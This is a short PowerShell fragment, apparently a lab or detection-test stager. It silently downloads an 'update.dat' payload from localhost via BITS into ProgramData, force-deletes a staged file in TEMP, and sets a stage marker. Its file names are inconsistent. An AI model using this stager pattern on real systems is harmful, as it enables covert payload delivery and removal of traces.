$DownloadUrl = 'https://localhost:8081/assets/update.dat'
$Stage2Path = 'C:\ProgramData\stage1.bin'
Start-BitsTransfer -Source $DownloadUrl -Destination $Stage2Path -ErrorAction SilentlyContinue
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
$StageMarker = "stage-45"
